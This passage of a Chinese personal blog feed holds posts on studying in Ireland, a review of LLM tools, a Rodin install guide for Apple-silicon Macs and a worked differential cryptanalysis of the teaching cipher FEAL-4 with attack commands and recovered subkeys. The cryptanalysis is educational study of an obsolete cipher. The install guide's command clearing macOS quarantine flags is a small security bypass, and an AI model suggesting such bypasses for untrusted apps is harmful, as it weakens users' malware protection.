&lt;li&gt;英国签证尽量在国内就申请好，在爱尔兰申请的话，只给半年，在国内申请，会给 2 年。这样无论是去北爱尔兰，还是去英国，都会很方便。&lt;/li&gt;
&lt;li&gt;这边课程很短。寒假和第二学期结束后，有大量时间。这些时间如果没有计划的话，会非常无聊。特别是冬天，日照很短。由于这边签证基本上需要找黄牛排队，所以，推荐来了就开始申请签证。稳一点的话，就抓一家大使馆开始刷签证。在签证期间内，往返一次目的地国家。当前在这个过程中也会花费大量的时间和金钱，但是没有办法，想要获得一张长期的申根签，就需要积累出入境记录。我申请的是法签。通常每次会按照以下时间发放：1 个月、3 个月、半年、一年、多年。单次多次出入境无所谓了，反正超过 3 个月的基本上不可能给单次。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;求职&#34;&gt;求职
&lt;/h1&gt;&lt;p&gt;这个也很关键。来之前懵懵懂懂，直到来了之后才有一个清晰的认识。这个部分由于我还在求职，也没有完全走完流程，会在走完流程之后再更新。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NG 岗位：也就是校招岗位，申请时间在来了之后的  9 月到 11 月份。11 月份之后，大部分校招岗位就关闭了。所以需要尽早申请。无论水平如何，都推荐申请一下 NG 岗位。不过，对于超过 2 年工作经验的人来说，大厂基本上 NG 岗位很难获得。但是相当于走了一下流程，若能够接收到面试，也算是丰富经验了。&lt;/li&gt;
&lt;li&gt;社招岗位：申请时间在次年 4 月底开始。由于我刚开始申请，所以也不太能说个所以然。另外，找工作也随缘吧。因为很多公司要求是有 1G 的签证才会有面试机会。申请太早的话，公司是不会处理的。&lt;/li&gt;
&lt;li&gt;实习岗位：这个就可遇不可求了，由于硕士只有一年，很多实习岗位并不是面相我们的，而是面相本科生的。只能说，尝试投递吧。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;交流&#34;&gt;交流
&lt;/h1&gt;&lt;p&gt;如果有疑问，也可以通过以下渠道联系我。&lt;/p&gt;
&lt;p&gt;小红书：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/C665F9BC-DFC8-427D-A955-F03D8BE9B6B4/D8B2F080-5BAA-4110-BB9A-2DD9795A6851_2/X2MSeHS8FahxCnpKs1sA8SxgUrd3zi6r7dC2ONIdk1Iz/Image.jpeg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.jpeg&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;Whatsapp：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/C665F9BC-DFC8-427D-A955-F03D8BE9B6B4/048B52B0-25F6-463B-80B9-B900BA913E51_2/oVWdi6ZdsJcJpjeyTnXSPs6UFbMEfx8mmy4ldxjJg3gz/Image.heic.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.heic.png&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>LLM 工具使用体验总结</title>
        <link>https://nansenli.com/zh-cn/post/2025/04/aitest/</link>
        <pubDate>Tue, 08 Apr 2025 19:47:56 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2025/04/aitest/</guid>
        <description>&lt;h1 id=&#34;chatgpt-o4-mini&#34;&gt;ChatGPT o4-mini
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;day://2025.04.17&#34; &gt;&lt;code&gt;Thu, Apr 17&lt;/code&gt;&lt;/a&gt; 这两天最新发布的模型，推理能力显著，多步执行能力优秀。看来o4-mini 在实际任务执行表现上全面超越 o3-mini。&lt;/p&gt;
&lt;p&gt;下图展示了我的一个使用的例子，问题是：“黑镜第七季第三集中出现了很多亚裔，这些亚裔是中国人还是韩国人，或者是日本人还是马来西亚人或者新加坡？”，模型成功的多次调用搜索引擎进行搜索，并获取到了正确答案：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/EB4BE820-4D12-498F-BD90-063A7969900B/BCB3C250-6CB1-4DED-8583-3F9FC2938FEA_2/y5psYgUJmVSrw8zoXtkl4DWBj6pXk66Hqtr22ltSZicz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;另外，projects也能在该模式下正常被调用和使用了，由于模型可以自主搜索，而不是使用rag的方式，使得搜索文件的效率大幅上升。&lt;/p&gt;
&lt;h1 id=&#34;chatgpt-不包含o3o4-mini&#34;&gt;ChatGPT （不包含o3、o4-mini）
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;GPT-4o：全能。满足日常交流学习，上下文足够大，轻松处理代码、文档检索等任务。支持多种附件格式和在线执行代码。缺点是生成的上下文长度过小，不适合生成太长内容。对过长的对话，上下文压缩严重，可能会忘记早前的内容。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Projects：略鸡肋。适合用于多个文件频繁搜索和检索文本的场景。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GPT-4o mini：弱于 GPT-4o，优点是上下文窗口巨大，推荐用于翻译超长文本的场合。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;o1：还不错的思维链模型，用于解决复杂的代码、数学题。不擅长处理感情及需要使用直觉的问题。但思维链过短，且质量不高。建议在输出结果后，将结果作为Gemini-2.5pro 或者DeepSeek-R1 的输入，优化质量。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;o3-mini：幻觉严重，不如 o1，但推理速度极快。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Search：略微鸡肋。新版本搜索结果被严重阉割，甚至不如模型不搜索时的输出质量。适合替代轻度搜索。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deep Research：神器。同类功能中质量最好，输出结果最完善。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GPT-4.5-preview：优秀。上下文窗口巨大，对长文本理解能力强。拥有海量记忆和最强直觉。其实不擅长推理，但是由于幻觉低，反而表现最好。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Canvas：整体不如 Cursor。上下文输出太小，文本长度受限。适合边写边编辑的短文本场景。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Work with Apps on macOS：功能体验被 Cursor 碾压，相当于 Cursor 的精简版。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;claude&#34;&gt;Claude
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Claude 3.7 Sonnet：优秀，适合生成各类代码。网页版支持超大上下文，几乎与 API 提供一致的上下文历史消息保留。模型非常适合撰写沟通类文本，如邮件，用词准确、简洁、不浮夸。缺点是免费版使用次数有限。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;deepseek&#34;&gt;DeepSeek
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;R1：幻觉严重，发挥不稳定，偶尔影响使用，对提示词质量要求极高。提示词正确或上下文完整时超越 o1。可以作为 o1 输出结果的输入，优化质量。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;V3：非常优秀，GPT-4o 平替。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;grok&#34;&gt;Grok
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Grok-3：生成文本流畅自然，AI 感较弱，适合自然写作和小说创作。整体中规中矩，生产力方面不如 GPT-4o 提供的工具多。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Grok-3 + search：优秀。坐拥英文社交数据，快速分析新闻实事。输出内容长，几乎不过滤索搜源内容，比 GPT-4o 搜索能力强。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Grok-Deep Search：略鸡肋，反而不如 Grok-3 + search。生成内容模板化严重，影响质量。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;gemini&#34;&gt;Gemini
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;2.5 Pro：非常优秀的模型，GPT-4o 平替，幻觉少，搜索结果质量高，思维链完整清晰，逻辑性强。支持与 Google 工具联动，特殊场景下非常有用，例如上传截图或文本并自动在 Google Calendar 中创建日程。缺点是经常声称自己使用了搜索，但实际上并未执行搜索。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deep Research：一般，略优于旧版 GPT Search。偶尔存在理解偏差，搜索和文档生成是分阶段执行，过程割裂，模板化严重。目前唯一能替代 GPT Deep Research 的产品。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;v0dev&#34;&gt;v0.dev
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;适合编写并在线预览前端组件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;chatqwenai&#34;&gt;chat.qwen.ai
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Qwen2.5-Max：非常优秀的模型，GPT-4o 平替，生成速度快，支持思考模式。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;知乎直答&#34;&gt;知乎直答
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;支持搜索知乎全网内容。可能的竞品是小红书直答。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;perplexity&#34;&gt;Perplexity
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;支持基础搜索，质量平庸，略鸡肋。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;mistralai&#34;&gt;Mistral.ai
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;速度快，上下文窗口大，GPT4o-mini 平替。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;cursor&#34;&gt;Cursor
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;神器。可对整个代码仓库建立索引，适合开发大型项目。支持多模型切换，支持本地命令行执行与终端接管，适合以下任务：
&lt;ul&gt;
&lt;li&gt;撰写 Latex 文档，替代 Overleaf&lt;/li&gt;
&lt;li&gt;辅助完成各类作业&lt;/li&gt;
&lt;li&gt;代码仓库搜索与特定功能定位&lt;/li&gt;
&lt;li&gt;创建单元测试&lt;/li&gt;
&lt;li&gt;执行 git 操作&lt;/li&gt;
&lt;li&gt;执行部署任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;几乎可以执行一切涉及文档和命令行的功能，在开发、调试、Debug、文档撰写方面均有帮助&lt;/li&gt;
&lt;li&gt;真正的现阶段最接近 Agent 的产品（于o3和o4-mini发布后不成立，因为o3和o4-mini也可以多步执行规划并完成任务了。不过o3和o4-mini仍然只能在自己的小环境里完成Agent，而Cursor可以在用户电脑上执行，这是一个优点。）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;例子leetcode-跟踪器&#34;&gt;例子：Leetcode 跟踪器
&lt;/h1&gt;&lt;p&gt;在淘宝上存在大量的 Leetcode 会员共享账号，但是我们有的时候还是需要将做题记录追加到自己的账号中。购买共享会员账号后，我们可以将某个公司的题目导出为 csv 文件，然后，将自己的做题记录也导出为 csv 文件，之后，对比这两个文件，我们可以轻松的去追踪当前的做题进度。Cursor 非常擅长撰写类似的小工具：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/EB4BE820-4D12-498F-BD90-063A7969900B/2F1390B4-A09D-4F33-8351-A84CEAFFD988_2/AyL4SxnKvRQN1HyrL8kxUxyPhT0WBLKOpOArV2UYOwAz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们只需要复制网页中的元素，Cursor 就可以为我们撰写完整的 csv 文件，并且自动生成完美的前端界面，极大的提高做题的效率。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>如何在搭载 Apple 芯片的 MacBook 上安装 Rodin 软件</title>
        <link>https://nansenli.com/zh-cn/post/2025/02/rodin/</link>
        <pubDate>Sat, 01 Feb 2025 13:02:01 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2025/02/rodin/</guid>
        <description>&lt;h3 id=&#34;在-macos-上安装-rodin-的步骤m1-arm-架构&#34;&gt;&lt;strong&gt;在 macOS 上安装 Rodin 的步骤（M1 ARM 架构）：&lt;/strong&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;安装 x86 JDK&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;从 Oracle 下载 &lt;strong&gt;Intel x86 JDK 18&lt;/strong&gt;（macOS .dmg）：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://download.oracle.com/java/18/archive/jdk-18.0.2.1_macos-x64_bin.dmg&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;jdk-18.0.2.1_macos-x64_bin.dmg&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;运行安装程序，它会自动配置 Java 环境。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;下载并安装 Rodin&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;从 SourceForge 获取 &lt;strong&gt;Rodin 3.8/3.9&lt;/strong&gt;（x86_64 版本）：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://sourceforge.net/projects/rodin-b-sharp/files/Core_Rodin_Platform/3.8/rodin-3.8.0.202304051545-af2f57e1e-macosx.cocoa.x86_64.tar.gz/download&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;rodin-3.8.0.202304051545-macosx.cocoa.x86_64.tar.gz&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解压 &lt;code&gt;.tar.gz&lt;/code&gt; 文件，并将 &lt;code&gt;Rodin.app&lt;/code&gt; 移动到 &lt;code&gt;/Applications&lt;/code&gt; 文件夹。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;修复 macOS 安全权限&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;运行以下命令以绕过&amp;quot;应用程序已损坏&amp;quot;的错误：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo xattr -cr /Applications/Rodin.app
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Rodin 应该可以正常运行，无需其他步骤（例如配置 Java VM 路径）。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>差分攻击 FEAL-4：从原理到实现</title>
        <link>https://nansenli.com/zh-cn/post/2025/01/feal-4/</link>
        <pubDate>Wed, 01 Jan 2025 13:15:04 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2025/01/feal-4/</guid>
        <description>&lt;p&gt;这篇文章主要介绍了如何对传统分组密码算法 FEAL-4 进行差分分析（Differential Cryptanalysis），并展示了攻击进程和关键实现细节。文中还包含了部分实验数据和攻击结果，可供有兴趣的读者参考或复现。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;两张重要图片&#34;&gt;两张重要图片
&lt;/h2&gt;&lt;p&gt;在正式展开分析之前，先给出两张与 FEAL-4 密切相关的图片，方便对差分传播和整体加密流程有一个直观认识。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;差分传播示意图&lt;/strong&gt;&lt;br&gt;
下图展示了在 FEAL-4 中，明文差分（XOR 形式）如何在加密轮次中传播并最终反映到密文上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/BC194830-506A-4A58-A67E-4C93B48730F8/E52F074B-64AB-4DF4-A553-907625B5D18F_2/UTpozkY6Wu2EoytDJ1dciSe132jz20EsyjndJ7GALVQz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;FEAL-4 工作流示意图&lt;/strong&gt;&lt;br&gt;
下图是 FEAL-4 的整体加密框架示意，包括明文的左右分块、各轮子密钥注入以及 F 函数的运用流程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/BC194830-506A-4A58-A67E-4C93B48730F8/FCB4E65D-A8EE-457F-A78C-4A788E832B87_2/rzEGfY9PioZpJMMK4Q466xqJI7rwGXEPRybyCDPuHW8z/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;f-函数的特性&#34;&gt;F 函数的特性
&lt;/h2&gt;&lt;p&gt;FEAL-4 的轮函数（即 F 函数）可以视作对 32 位输入进行某种随机化排列（Permutation）。在差分分析中，我们并不需要 F 的具体实现，而更关注它的两个关键差分属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若 $X \oplus Y = 0$，则 $F(X) = F(Y)$。&lt;/li&gt;
&lt;li&gt;若 $X \oplus Y = 0x80800000$，则 $F(X) \oplus F(Y) = 0x02000000$。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了这两个结论，在后续分析时就能推断特定差分输入下的输出表现，从而帮助定位子密钥。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;差分路径的详细分析&#34;&gt;差分路径的详细分析
&lt;/h2&gt;&lt;p&gt;假设我们选择一对特殊的明文 $P_0$ 和 $P_1$，满足：
$$
P_0 \oplus P_1 = 0x8080000080800000 = P^{\prime}.
$$
这个特定差分向量有助于简化 FEAL-4 若干轮次输出中的差分计算。&lt;/p&gt;
&lt;h3 id=&#34;1-初始轮次差分推导&#34;&gt;1. 初始轮次差分推导
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;令 $(L0_0, R0_0)$ 表示 $P_0$ 的左右分块（同理 $(L0_1, R0_1)$ 表示 $P_1$ 的左右分块）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;经过第一轮的异或操作后：
$$
L1_0 \oplus L1_1 = (L0_0 \oplus K4) \oplus (L0_1 \oplus K4)
= L0_0 \oplus L1_0
= 0x80800000.
$$
同理可推出右半部分的差分。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;进一步由于加密时存在 “额外一轮 XOR”，可得到：
$$
R2_0 \oplus R2_1
= (R1_0 \oplus L1_0) \oplus (R1_1 \oplus L1_1)
= 0x80800000 \oplus 0x80800000
= 0.
$$
这意味着在后续计算中，差分会以更简单的形式得以归并。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-后向差分计算backward-calculation&#34;&gt;2. 后向差分计算（Backward Calculation）
&lt;/h3&gt;&lt;p&gt;当我们获得明文对 $(P_0, P_1)$ 与对应的密文对 $(C_0, C_1)$ 后，可以进一步进行后向推导。令密文记作 $(L, R)$，则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;计算出 $C^{\prime} = C_0 \oplus C_1$，得到 $(L^{\prime}, R^{\prime})$。&lt;/li&gt;
&lt;li&gt;根据已知差分性质，可在末轮逐步还原 $X^{\prime}$、$Y^{\prime}$、$Z^{\prime}$ 等中间变量。&lt;/li&gt;
&lt;li&gt;利用这些结果便可对各子密钥展开攻击或验证。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;攻击-k3&#34;&gt;攻击 K3
&lt;/h2&gt;&lt;p&gt;在差分分析中，往往先从某个中间轮次子密钥开始，例如 $K_3$。具体步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;选取明文对：&lt;/strong&gt; 我生成了 12 对满足&lt;br&gt;
$$
P_0 \oplus P_1 = 0x8080000080800000
$$&lt;br&gt;
的随机明文。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;加密并提取差分：&lt;/strong&gt; 将上述明文对加密后，得到相应的密文对；结合差分路径推导出 $Y_0$、$Y_1$、$Z^{\prime}$ 等中间值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;遍历 $K_3$：&lt;/strong&gt;&lt;br&gt;
$$
Z^{\prime} = Z_0 \oplus Z_1 = F(Y_0 \oplus K_3) \oplus F(Y_1 \oplus K_3).
$$&lt;br&gt;
只要找到满足差分方程 $= 0x02000000$ 的候选即保留。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过这种方法，我成功得到四个候选子密钥：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cfa38976, cfa309f6, 4f238976, 4f2309f6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行以上过程的命令示例为：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./main -mode=attackk3 -file=K3.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;该实现与我在 &lt;a class=&#34;link&#34; href=&#34;https://www.theamazingking.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.theamazingking.com&lt;/a&gt; 上介绍的方法一致。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;攻击-k2&#34;&gt;攻击 K2
&lt;/h2&gt;&lt;p&gt;在拿到 $K_3$ 的若干候选后，可以继续推算 $K_2$。其核心方程：
$$
X&amp;rsquo; = X_0 \oplus X_1
= F(U_0 \oplus K_2) \oplus F(U_1 \oplus K_2),
$$
其中 $U$ 来自于上一轮运算（包括对 $Y$、$Z$ 等的进一步计算）。同样地：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;生成明文对，满足差分条件
$$
P_0 \oplus P_1 = 0x0000000080800000.
$$&lt;/li&gt;
&lt;li&gt;抓取加密后密文差分，通过遍历所有可能 $K_2$ 值，检查是否能满足差分约束 $=0x02000000$。&lt;/li&gt;
&lt;li&gt;命令示例：
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./main -mode=attackk2 -file=K2.txt -k3=cfa38976,cfa309f6,4f238976,4f2309f6
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;最终输出示例如下所示：
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Candidate K2: 8b722e41 (K3: cfa38976)
Candidate K2: 8b72aec1 (K3: cfa38976)
...
Candidate K2: 89722e43 (K3: 4f2309f6)
Candidate K2: 8972aec3 (K3: 4f2309f6)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;攻击-k1&#34;&gt;攻击 K1
&lt;/h2&gt;&lt;p&gt;类似地，攻击 $K_1$ 也可以按前面流程来做。&lt;br&gt;
为了让差分路径能稳定呈现预期结果，我生成了 12 对满足&lt;br&gt;
$$
P_0 \oplus P_1 = 0x0000000002000000
$$&lt;br&gt;
的明文，并验证其加密输出。&lt;/p&gt;
&lt;p&gt;命令示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./main -mode=attackk1 -file=K1.txt -k3k2=&amp;#34;cfa38976,8b722e41; cfa38976,8b72aec1; ...&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可一次性将前面得到的所有 $K_3, K_2$ 候选组合带入，最终找到对应的 $K_1$ 候选。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;攻击-k0-k4-k5&#34;&gt;攻击 K0, K4, K5
&lt;/h2&gt;&lt;p&gt;当 $K_3, K_2, K_1$ 全部到手后，就可以反推最后一轮所需的 $K_0, K_4, K_5$。&lt;br&gt;
设最终加密得到的左、右部分为 $L_0, R_0$。对应的明文分块为 $PL, PR$。则有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$PL \oplus K_4 = LR_0$&lt;/li&gt;
&lt;li&gt;$PR \oplus K_5 = RR_0$&lt;/li&gt;
&lt;li&gt;$RR_0 \oplus LR_0 = R_0$&lt;/li&gt;
&lt;li&gt;$f(R_0 \oplus K_0) \oplus L_0 = LR_0$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;只要枚举所有可能的 $K_0$，即可通过上述方程解出相应的 $K_4$ 与 $K_5$。然后用其他明文-密文对交叉验证正确性。若都满足，则得到正确的最终密钥集。&lt;/p&gt;
&lt;p&gt;命令示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./main -mode=attackk0k4k5 -k3k2k1=&amp;#34;...&amp;#34; -file=K1.txt -file2=K1_p.txt
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;实现优化与验证&#34;&gt;实现、优化与验证
&lt;/h2&gt;&lt;h3 id=&#34;1-自动化生成与并行计算&#34;&gt;1. 自动化生成与并行计算
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;自动生成随机明文对&lt;/strong&gt;：在代码中事先控制 XOR 差分，即可批量输出满足需求的明文文件（如 &lt;code&gt;K3_p.txt&lt;/code&gt;, &lt;code&gt;K2_p.txt&lt;/code&gt;, &lt;code&gt;K1_p.txt&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;并行化搜索&lt;/strong&gt;：使用 Go 语言的 Goroutines，开启 10 个并行任务，在带有 10 核的 Mac 上最大化利用 CPU 资源。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进度条与可视化&lt;/strong&gt;：通过 &lt;code&gt;progressbar&lt;/code&gt; 库实时显示搜索进度，让实验过程更直观。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-验证方法&#34;&gt;2. 验证方法
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;本地自定义密钥测试&lt;/strong&gt;&lt;br&gt;
先选定一套已知的 $K_0$–$K_5$（如 &lt;code&gt;0x00000001, 0x00000002, 0x00000004, 0x00000008, 0x00000010, 0x00000020&lt;/code&gt;），对前面生成的明文对进行加密，并重复差分分析过程，看是否能在结果中匹配这套密钥。&lt;br&gt;
实验证明能够正确还原这组测试密钥，从而确认代码逻辑的准确性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;特定明文-密文对测试&lt;/strong&gt;&lt;br&gt;
选定一个明文 &lt;code&gt;1234567890abcdef&lt;/code&gt; 和在 Einstein Zone 生成的密文 &lt;code&gt;f43ae3eeb56e2bbf&lt;/code&gt;，验证最终得到的 256 组候选 $K_0$–$K_5$ 中，每一组都可重现这条加密映射，进一步确认攻击流程无误。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;最终结果&#34;&gt;最终结果
&lt;/h2&gt;&lt;p&gt;所有解出的 $K_0$–$K_5$ 存放于 &lt;code&gt;final_result.txt&lt;/code&gt;。去重后包括以下范围：&lt;/p&gt;
&lt;h3 id=&#34;possible-values-for-k0&#34;&gt;Possible Values for K0
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;890c2148 890ca1c8 098c2148 098ca1c8 ...
0b8c214a 0b8ca1ca 8b0c214a 8b0ca1ca
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;possible-values-for-k1&#34;&gt;Possible Values for K1
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;471f077e 471f87fe c79f077e c79f87fc ...
451f077c 451f87fc c59f077c c59f87fc
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;possible-values-for-k2&#34;&gt;Possible Values for K2
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;8b722e41 8b72aec1 8b722e43 8b72aec3 ...
89722e43 8972aec3
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;possible-values-for-k3&#34;&gt;Possible Values for K3
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cfa38976 cfa309f6 4f238976 4f2309f6
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;possible-values-for-k4&#34;&gt;Possible Values for K4
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;89eb0024 89eb0026 8beb0024 8beb0026
